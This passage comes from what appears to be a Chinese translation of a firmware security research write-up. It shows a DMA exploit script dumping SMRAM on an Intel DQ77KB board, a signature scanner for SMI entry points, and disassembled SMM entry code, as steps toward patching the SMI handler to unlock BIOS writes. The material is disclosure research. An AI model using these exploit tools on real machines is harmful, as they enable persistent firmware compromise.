class="line">            ptr += self.MAX_IO_SIZE</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] DONE&#x27;</span></span><br></pre></td></tr></table></figure>


<p>下面是<code>DmaExpl</code>用法示例，该代码从0xD7000000开始读取一页物理内存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># initialize exploit</span></span><br><span class="line">expl = DmaExpl(<span class="number">0xD7000000</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># perform physical memory read</span></span><br><span class="line">data = expl.read(<span class="number">0x1000</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># stop SystemTap script</span></span><br><span class="line">expl.close()</span><br></pre></td></tr></table></figure>


<p>使用此类，我实现了名为<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/UEFI_boot_script_expl/blob/master/dma_expl.py">dma_expl.py</a>的Python脚本，下面是在Intel DQ77KB主板上将SMRAM的TSEG区域转储到文件中的用法示例。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">localhost ~ <span class="comment"># python dma_expl.py --read 0xD7000000 --size 0x800000 --file TSEG.bin</span></span><br><span class="line">[+] Memory allocated at 0x7ff0542ec000</span><br><span class="line">[+] Physical address is 0x3fa15e000</span><br><span class="line">Pass 1: parsed user script and 109 library script(s) using 62176virt/36376res/4216shr/32976data kb, <span class="keyword">in</span> 160usr/0sys/171real ms.</span><br><span class="line">Pass 2: analyzed script: 1 probe(s), 14 <span class="keyword">function</span>(s), 4 embed(s), 2 global(s) using 108880virt/84544res/5644shr/79680data kb, <span class="keyword">in</span> 780usr/220sys/1120real ms.</span><br><span class="line">Pass 3: translated to C into <span class="string">&quot;/tmp/stapcorPM2/stap_c190a79e672287641579099c59eed383_7943_src.c&quot;</span> using 108880virt/84672res/5772shr/79680data kb, <span class="keyword">in</span> 170usr/60sys/236real ms.</span><br><span class="line">Pass 4: compiled C into <span class="string">&quot;stap_c190a79e672287641579099c59eed383_7943.ko&quot;</span> <span class="keyword">in</span> 3560usr/270sys/5209real ms.</span><br><span class="line">Pass 5: starting run.</span><br><span class="line">[+] SystemTap script started</span><br><span class="line">[+] Reading physical memory 0xd7000000 - 0xd701dfff</span><br><span class="line">[+] Reading physical memory 0xd701e000 - 0xd703bfff</span><br><span class="line">[+] Reading physical memory 0xd703c000 - 0xd7059fff</span><br><span class="line">[+] Reading physical memory 0xd705a000 - 0xd7077fff</span><br><span class="line">[+] Reading physical memory 0xd7078000 - 0xd7095fff</span><br><span class="line">[+] Reading physical memory 0xd7096000 - 0xd70b3fff</span><br><span class="line">[+] Reading physical memory 0xd70b4000 - 0xd70d1fff</span><br><span class="line">[+] Reading physical memory 0xd70d2000 - 0xd70effff</span><br><span class="line">[+] Reading physical memory 0xd70f0000 - 0xd710dfff</span><br><span class="line">[+] Reading physical memory 0xd710e000 - 0xd712bfff</span><br><span class="line">[+] Reading physical memory 0xd712c000 - 0xd7149fff</span><br><span class="line">[+] Reading physical memory 0xd714a000 - 0xd7167fff</span><br><span class="line">[+] Reading physical memory 0xd7168000 - 0xd7185fff</span><br><span class="line">[+] Reading physical memory 0xd7186000 - 0xd71a3fff</span><br><span class="line">[+] Reading physical memory 0xd71a4000 - 0xd71c1fff</span><br><span class="line">[+] Reading physical memory 0xd71c2000 - 0xd71dffff</span><br><span class="line">[+] Reading physical memory 0xd71e0000 - 0xd71fdfff</span><br><span class="line">[+] Reading physical memory 0xd71fe000 - 0xd721bfff</span><br><span class="line">[+] Reading physical memory 0xd721c000 - 0xd7239fff</span><br><span class="line">[+] Reading physical memory 0xd723a000 - 0xd7257fff</span><br><span class="line">[+] Reading physical memory 0xd7258000 - 0xd7275fff</span><br><span class="line">[+] Reading physical memory 0xd7276000 - 0xd7293fff</span><br><span class="line">[+] Reading physical memory 0xd7294000 - 0xd72b1fff</span><br><span class="line">[+] Reading physical memory 0xd72b2000 - 0xd72cffff</span><br><span class="line">[+] Reading physical memory 0xd72d0000 - 0xd72edfff</span><br><span class="line">[+] Reading physical memory 0xd72ee000 - 0xd730bfff</span><br><span class="line">[+] Reading physical memory 0xd730c000 - 0xd7329fff</span><br><span class="line">[+] Reading physical memory 0xd732a000 - 0xd7347fff</span><br><span class="line">[+] Reading physical memory 0xd7348000 - 0xd7365fff</span><br><span class="line">[+] Reading physical memory 0xd7366000 - 0xd7383fff</span><br><span class="line">[+] Reading physical memory 0xd7384000 - 0xd73a1fff</span><br><span class="line">[+] Reading physical memory 0xd73a2000 - 0xd73bffff</span><br><span class="line">[+] Reading physical memory 0xd73c0000 - 0xd73ddfff</span><br><span class="line">[+] Reading physical memory 0xd73de000 - 0xd73fbfff</span><br><span class="line">[+] Reading physical memory 0xd73fc000 - 0xd7419fff</span><br><span class="line">[+] Reading physical memory 0xd741a000 - 0xd7437fff</span><br><span class="line">[+] Reading physical memory 0xd7438000 - 0xd7455fff</span><br><span class="line">[+] Reading physical memory 0xd7456000 - 0xd7473fff</span><br><span class="line">[+] Reading physical memory 0xd7474000 - 0xd7491fff</span><br><span class="line">[+] Reading physical memory 0xd7492000 - 0xd74affff</span><br><span class="line">[+] Reading physical memory 0xd74b0000 - 0xd74cdfff</span><br><span class="line">[+] Reading physical memory 0xd74ce000 - 0xd74ebfff</span><br><span class="line">[+] Reading physical memory 0xd74ec000 - 0xd7509fff</span><br><span class="line">[+] Reading physical memory 0xd750a000 - 0xd7527fff</span><br><span class="line">[+] Reading physical memory 0xd7528000 - 0xd7545fff</span><br><span class="line">[+] Reading physical memory 0xd7546000 - 0xd7563fff</span><br><span class="line">[+] Reading physical memory 0xd7564000 - 0xd7581fff</span><br><span class="line">[+] Reading physical memory 0xd7582000 - 0xd759ffff</span><br><span class="line">[+] Reading physical memory 0xd75a0000 - 0xd75bdfff</span><br><span class="line">[+] Reading physical memory 0xd75be000 - 0xd75dbfff</span><br><span class="line">[+] Reading physical memory 0xd75dc000 - 0xd75f9fff</span><br><span class="line">[+] Reading physical memory 0xd75fa000 - 0xd7617fff</span><br><span class="line">[+] Reading physical memory 0xd7618000 - 0xd7635fff</span><br><span class="line">[+] Reading physical memory 0xd7636000 - 0xd7653fff</span><br><span class="line">[+] Reading physical memory 0xd7654000 - 0xd7671fff</span><br><span class="line">[+] Reading physical memory 0xd7672000 - 0xd768ffff</span><br><span class="line">[+] Reading physical memory 0xd7690000 - 0xd76adfff</span><br><span class="line">[+] Reading physical memory 0xd76ae000 - 0xd76cbfff</span><br><span class="line">[+] Reading physical memory 0xd76cc000 - 0xd76e9fff</span><br><span class="line">[+] Reading physical memory 0xd76ea000 - 0xd7707fff</span><br><span class="line">[+] Reading physical memory 0xd7708000 - 0xd7725fff</span><br><span class="line">[+] Reading physical memory 0xd7726000 - 0xd7743fff</span><br><span class="line">[+] Reading physical memory 0xd7744000 - 0xd7761fff</span><br><span class="line">[+] Reading physical memory 0xd7762000 - 0xd777ffff</span><br><span class="line">[+] Reading physical memory 0xd7780000 - 0xd779dfff</span><br><span class="line">[+] Reading physical memory 0xd779e000 - 0xd77bbfff</span><br><span class="line">[+] Reading physical memory 0xd77bc000 - 0xd77d9fff</span><br><span class="line">[+] Reading physical memory 0xd77da000 - 0xd77f7fff</span><br><span class="line">[+] Reading physical memory 0xd77f8000 - 0xd77fffff</span><br><span class="line">[+] DONE</span><br></pre></td></tr></table></figure>


<h2 id="奇怪的SMI入口点"><a href="#奇怪的SMI入口点" class="headerlink" title="奇怪的SMI入口点"></a>奇怪的SMI入口点</h2><p>现在我们可以读写SMRAM的内容了，通过修改其代码，可以防止SMM中的<code>BIOSWE</code>位复位。<br>你可能已经从<a target="_blank" rel="noopener" href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-system-programming-manual-325384.pdf">Intel® 64 and IA-32 Architectures Software Developer’s Manual</a>系统编程指南的第三章中了解到了：当处理器切换到系统管理模式时，它会开始执行SMI处理程序代码，该代码位于距SMRAM开头的固定偏移量0x8000处：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162716258.png" alt="image-20230809162716258"></p>
<p>所以要从操作系统设置<code>BIOSWE</code>位，我们只需要做一件事——使用从SMM退出到操作系统的<a target="_blank" rel="noopener" href="http://www.felixcloutier.com/x86/RSM.html">RSM</a>指令来修改SMI处理程序代码。在测试硬件上，我遇到了一些非常奇怪的事情：当我在十六进制编辑器中打开TSEG区域转储并检查0x8000偏移量时——我发现那里的数据看起来根本不像是有效的可执行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">localhost ~ # hexdump -C --skip 0x8000 --length 0x100 TSEG.bin</span><br><span class="line">00008000  00 10 00 00 00 00 00 00  00 00 0a 00 00 00 00 00  |................|</span><br><span class="line">00008010  ee 03 00 00 00 00 00 00  b6 d7 15 77 34 b0 ff 97  |...........w4...|</span><br><span class="line">00008020  83 46 8f 3f 79 14 d9 c5  99 94 82 dc ff e0 da bf  |.F.?y...........|</span><br><span class="line">00008030  c3 5b 2d 31 28 93 71 06  54 7d 64 20 8c 9a a3 82  |.[-1(.q.T&#125;d ....|</span><br><span class="line">00008040  bf 6b a2 e0 6a 13 4b 99  3c a2 c3 58 0a 3a 7b 8f  |.k..j.K.&lt;..X.:&#123;.|</span><br><span class="line">00008050  2d 24 cb 56 8e 4e b9 38  20 b3 4d 9c 4d 1a 58 8f  |-$.V.N.8 .M.M.X.|</span><br><span class="line">00008060  ce a9 3a 51 f6 6c 05 57  7b 2f 60 13 5b 5d d3 b4  |..:Q.l.W&#123;/`.[]..|</span><br><span class="line">00008070  a5 05 0f 07 ec c5 88 d1  91 5e 95 0a 21 11 ee 5a  |.........^..!..Z|</span><br><span class="line">00008080  8a 7f 0b a3 3b da f8 62  5c 56 e2 b7 4d 50 c2 e7  |....;..b\V..MP..|</span><br><span class="line">00008090  1e a7 41 cd 1e 6c ea f9  de 36 a1 05 6e 08 d2 8b  |..A..l...6..n...|</span><br><span class="line">000080a0  1b 90 e1 d4 cf 61 02 ff  6b c4 fb fe c3 74 84 f5  |.....a..k....t..|</span><br><span class="line">000080b0  27 63 5d ac 90 dd 2d 01  d4 4a a4 39 6c 97 53 84  |&#x27;c]...-..J.9l.S.|</span><br><span class="line">000080c0  87 6d 1c 33 e4 dd 8c cc  1c 40 d3 05 82 d6 3f a1  |.m.3.....@....?.|</span><br><span class="line">000080d0  77 a2 ce 44 18 4f 72 b1  48 52 f9 ae 17 d2 75 fb  |w..D.Or.HR....u.|</span><br><span class="line">000080e0  16 7f 54 d8 40 88 de 0b  89 7f 19 1a 67 c9 cd fe  |..T.@.......g...|</span><br><span class="line">000080f0  45 3f 7f 98 54 89 d4 03  11 69 55 b1 c1 8c 1e 5c  |E?..T....iU....\|</span><br></pre></td></tr></table></figure>


<p>为了调查此问题的原因，我下载了<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Intel_Quark">Quark</a>的<a target="_blank" rel="noopener" href="https://downloadcenter.intel.com/download/23197/Intel-Quark-BSP">Board Support Package</a>，其中包含UEFI兼容主板固件的开源实现。Quark BSP还有一些系统管理模式代码——它的功能非常有限，并且不支持x86_64系统，但是它仍然可以告诉我们一些有用的信息。下面是Quark BSP源代码中的 SMI入口点：<br><code>IA32FamilyCpuBasePkg/PiSmmCpuDxeSmm/Ia32/SmiEntry.asm</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">_SmiEntryPoint  PROC</span><br><span class="line">    DB      0bbh                        ; mov bx, imm16</span><br><span class="line">    DW      offset _GdtDesc - _SmiEntryPoint + 8000h</span><br><span class="line">    DB      2eh, 0a1h                   ; mov ax, cs:[offset16]</span><br><span class="line">    DW      DSC_OFFSET + DSC_GDTSIZ</span><br><span class="line">    dec     eax</span><br><span class="line">    mov     cs:[edi], eax               ; mov cs:[bx], ax</span><br><span class="line">    DB      66h, 2eh, 0a1h              ; mov eax, cs:[offset16]</span><br><span class="line">    DW      DSC_OFFSET + DSC_GDTPTR</span><br><span class="line">    mov     cs:[edi + 2], ax            ; mov cs:[bx + 2], eax</span><br><span class="line">    mov     bp, ax                      ; ebp = GDT base</span><br><span class="line">    DB      66h</span><br><span class="line">    lgdt    fword ptr cs:[edi]          ; lgdt fword ptr cs:[bx]</span><br><span class="line">    DB      66h, 0b8h                   ; mov eax, imm32</span><br><span class="line">gSmiCr3     DD      ?</span><br><span class="line">    mov     cr3, eax</span><br><span class="line">    DB      66h</span><br><span class="line">    mov     eax, 020h                   ; as cr4.PGE is not set here, refresh cr3</span><br><span class="line">    mov     cr4, eax                    ; in PreModifyMtrrs() to flush TLB.</span><br><span class="line">    DB      2eh, 0a1h                   ; mov ax, cs:[offset16]</span><br><span class="line">    DW      DSC_OFFSET + DSC_CS</span><br><span class="line">    mov     cs:[edi - 2], eax           ; mov cs:[bx - 2], ax</span><br><span class="line">    DB      66h, 0bfh                   ; mov edi, SMBASE</span><br><span class="line">gSmbase    DD    ?</span><br><span class="line">    DB      67h</span><br><span class="line">    lea     ax, [edi + (@32bit - _SmiEntryPoint) + 8000h]</span><br><span class="line">    mov     cs:[edi - 6], ax            ; mov cs:[bx - 6], eax</span><br><span class="line">    mov     ebx, cr0</span><br><span class="line">    DB      66h</span><br><span class="line">    and     ebx, 9ffafff3h</span><br><span class="line">    DB      66h</span><br><span class="line">    or      ebx, 80000023h</span><br><span class="line">    mov     cr0, ebx</span><br><span class="line">    DB      66h, 0eah</span><br><span class="line">    DD      ?</span><br><span class="line">    DW      ?</span><br><span class="line">_GdtDesc    FWORD   ?</span><br><span class="line">@32bit:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    ;</span><br><span class="line">    ; 32-bit SMI handler code goes here</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>

<p>SMI处理程序在类似于实模式的16位环境中开始执行，上面列出的代码执行了执行环境的基本初始化，并跳转到32位保护模式，多数SMM的东西都在该模式下运行。<br>利用这些信息，我编写了一个Python程序，该程序通过16位代码存根来使用简单的签名在TSEG转储中查找SMI入口点：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os, struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 从SMRAM转储中提取SMI入口信息。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_smi_entry</span>(<span class="params">data</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 标准SMI入口存根签名</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    ptr = <span class="number">0</span></span><br><span class="line">    sig = [ <span class="string">&#x27;\xBB&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;\x80&#x27;</span>,                   <span class="comment"># mov     bx, 80XXh</span></span><br><span class="line">            <span class="string">&#x27;\x66&#x27;</span>, <span class="string">&#x27;\x2E&#x27;</span>, <span class="string">&#x27;\xA1&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;\xFB&#x27;</span>,   <span class="comment"># mov     eax, cs:dword_FBXX</span></span><br><span class="line">            <span class="string">&#x27;\x66&#x27;</span>, <span class="literal">None</span>, <span class="literal">None</span>,                     <span class="comment"># mov     edx, eax</span></span><br><span class="line">            <span class="string">&#x27;\x66&#x27;</span>, <span class="literal">None</span>, <span class="literal">None</span> ]                    <span class="comment"># mov     ebp, eax</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> ptr &lt; <span class="built_in">len</span>(data):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        found = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sig)):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 在SMRAM的每100h偏移处检查签名</span></span><br><span class="line">            <span class="keyword">if</span> sig[i] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> sig[i] != data[ptr + i]:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                found = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;SMI entry found at 0x%x&#x27;</span> % ptr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        ptr += <span class="number">0x100</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    find_smi_entry(<span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>


<p>该程序成功找到了四次不同的处理程序代码，看起来很不错——每个CPU内核都有一个专用的SMI入口点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">localhost ~ # python smi_entry.py TSEG.bin</span><br><span class="line">SMI entry at 0x3f6800</span><br><span class="line">SMI entry at 0x3f7000</span><br><span class="line">SMI entry at 0x3f7800</span><br><span class="line">SMI entry at 0x3f8000</span><br></pre></td></tr></table></figure>


<p>下面是我的Intel DQ77KB主板上反汇编的SMI入口点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line">; 16-bit SMI entry stub that enables protected mode</span><br><span class="line">;</span><br><span class="line">mov     bx, 8091h           ; Get GDT descriptor address</span><br><span class="line">mov     eax, cs:0FB48h      ; Get physical address of new GDT</span><br><span class="line">mov     edx, eax</span><br><span class="line">mov     ebp, eax</span><br><span class="line">add     edx, 50h</span><br><span class="line">mov     [eax+42h], dx       ; Initialize GDT entry</span><br><span class="line">shr     edx, 10h</span><br><span class="line">mov     [eax+44h], dl</span><br><span class="line">mov     [eax+47h], dh</span><br><span class="line">mov     ax, cs:0FB50h</span><br><span class="line">dec     ax</span><br><span class="line">mov     cs:[bx], ax          ; Set GDT limit</span><br><span class="line">mov     eax, cs:0FB48h</span><br><span class="line">mov     cs:[bx+2], eax       ; Set GDT physical address</span><br><span class="line">db      66h</span><br><span class="line">lgdt    fword ptr cs:[bx]    ; Switch to the new GDT</span><br><span class="line">mov     eax, 0D73CB000h</span><br><span class="line">mov     cr3, eax             ; Set page directory base</span><br><span class="line">mov     eax, 668h</span><br><span class="line">mov     cr4, eax             ; Enable PAE</span><br><span class="line">mov     ax, cs:0FB14h   </span><br><span class="line">mov     cs:[bx+48h], ax      ; Patch long mode jump with CS segment selector</span><br><span class="line">mov     ax, 10h</span><br><span class="line">mov     cs:[bx-2], ax        ; Patch protected mode jump with CS segment selector</span><br><span class="line">mov     edi, cs:0FEF8h   </span><br><span class="line">lea     eax, [edi+80DBh]     ; Get 64-bit stub address</span><br><span class="line">mov     cs:[bx+44h], eax     ; Patch long mode jump with given address</span><br><span class="line">lea     eax, [edi+8097h]     ; Get 32-bit stub address</span><br><span class="line">mov     cs:[bx-6], eax       ; Patch protected mode jump with given address</span><br><span class="line">mov     ecx, 0C0000080h      ; IA32_EFER MSR number</span><br><span class="line">mov     ebx, 23h</span><br><span class="line">mov     cr0, ebx             ; Enable protected mode</span><br><span class="line">jmp     large far ptr 10h:0D73F6897h ; Jump to the protected mode code</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">;</span><br><span class="line">; 32-bit SMI entry stub that enables long mode</span><br><span class="line">;</span><br><span class="line">mov     ax, 18h          </span><br><span class="line">mov     ds, ax               ; Update protected mode segment registers</span><br><span class="line">mov     es, ax</span><br><span class="line">mov     ss, ax</span><br><span class="line">mov     al, 1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">loc_D73F68A3:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">xchg    al, [ebp+8]</span><br><span class="line">cmp     al, 0</span><br><span class="line">jz      short loc_D73F68AE</span><br><span class="line">pause</span><br><span class="line">jmp     short loc_D73F68A3</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">loc_D73F68AE:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mov     eax, ebp</span><br><span class="line">mov     edx, eax</span><br><span class="line">mov     dl, 89h</span><br><span class="line">mov     [eax+45h], dl</span><br><span class="line">mov     eax, 40h</span><br><span class="line">ltr     ax</span><br><span class="line">mov     al, 0</span><br><span class="line">xchg    al, [ebp+8]</span><br><span class="line">rdmsr                        ; Read current IA32_EFER MSR value</span><br><span class="line">or      ah, 1                ; Set long mode enabled flag</span><br><span class="line">wrmsr                        ; Update IA32_EFER MSR value</span><br><span class="line">mov     ebx, 80000023h</span><br><span class="line">mov     cr0, ebx             ; Enable paging</span><br><span class="line">db      67h</span><br><span class="line">jmp     far ptr 38h:0D73F68DBh ; Jump to the long mode code</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">;</span><br><span class="line">; 64-bit SMI entry stub that calls UEFI SMM foundation code</span><br><span class="line">;</span><br><span class="line">lea     ebx, [edi+0FB00h]</span><br><span class="line">mov     ax, [rbx+16h]</span><br><span class="line">mov     ds, ax               ; Update long mode segment registers</span><br><span class="line">mov     ax, [rbx+1Ah]</span><br><span class="line">mov     es, ax</span><br><span class="line">mov     fs, ax</span><br><span class="line">mov     gs, ax</span><br><span class="line">mov     ax, [rbx+18h]</span><br><span class="line">mov     ss, ax</span><br><span class="line">mov     rsp, 0D73D4FF8h</span><br><span class="line">mov     rcx, [rsp]</span><br><span class="line">mov     rax, 0D70044E4h</span><br><span class="line">sub     rsp, 208h</span><br><span class="line">fxsave  qword ptr [rsp]      ; Save FPU registers</span><br><span class="line">add     rsp, 0FFFFFFFFFFFFFFE0h</span><br><span class="line">call    rax                  ; sub_D70044E4() that does SMI handling stuff</span><br><span class="line">add     rsp, 20h</span><br><span class="line">fxrstor qword ptr [rsp]      ; Restore FPU registers</span><br><span class="line">rsm</span><br></pre></td></tr></table></figure>


